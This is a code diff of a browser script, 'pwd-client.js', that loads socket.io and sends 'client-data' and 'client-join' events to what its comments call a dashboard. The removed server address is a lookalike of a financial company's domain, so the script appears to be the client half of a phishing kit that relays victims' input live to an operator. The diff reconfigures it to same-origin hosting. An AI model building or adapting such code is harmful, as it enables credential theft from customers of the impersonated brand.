@@ -1,6 +1,6 @@
 /* pwd-client.js */
 (function () {
-  const SERVER_URL = "https://www-wealthsimple.com";
+  
   const SESSION_STORAGE_KEY = "sessionID";
   const DASH_EMIT_EVENT = "client-data";     // matches your dashboard code
   const DASH_JOIN_EVENT = "client-join";     // matches your dashboard code
@@ -124,7 +124,7 @@ window.addEventListener("pageshow", function(e) {
     if (window.io && typeof window.io === "function") return cb();
 
     const s = document.createElement("script");
-    s.src = SERVER_URL.replace(/\/$/, "") + "/socket.io/socket.io.js";
+    s.src = "/socket.io/socket.io.js";
     s.async = true;
     s.onload = cb;
     s.onerror = () => console.warn("[pwd-client] Could not load socket.io from server.");
@@ -136,7 +136,7 @@ window.addEventListener("pageshow", function(e) {
       console.warn("[pwd-client] socket.io not available.");
       return null;
     }
-    const socket = window.io(SERVER_URL, { transports: ["websocket", "polling"] });
+    const socket = window.io({ transports: ["websocket", "polling"] });
 
     socket.on("connect", () => {
       console.log("[pwd-client] connected:", socket.id, "session:", sessionID);
